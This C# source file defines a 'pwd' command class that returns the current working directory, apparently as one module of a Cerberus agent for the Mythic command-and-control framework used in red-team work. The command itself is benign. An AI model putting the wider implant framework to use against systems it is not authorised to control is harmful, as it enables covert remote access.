using Models.Tasks;
using Managers;

using System.IO;

namespace Tasks.Commands
{
    public class PrintWorkingDirectory : CerberusCommand
    {
        public override string Name => "pwd";

        public override MythicTaskResult Execute(MythicTask task)
        {
            //return Directory.GetCurrentDirectory();
            var result = new MythicTaskResult
            {
                task_id = task.id,
                user_output = Directory.GetCurrentDirectory(),
                completed = true,
                status = "success"
            };

            return result;
        }
    }
}
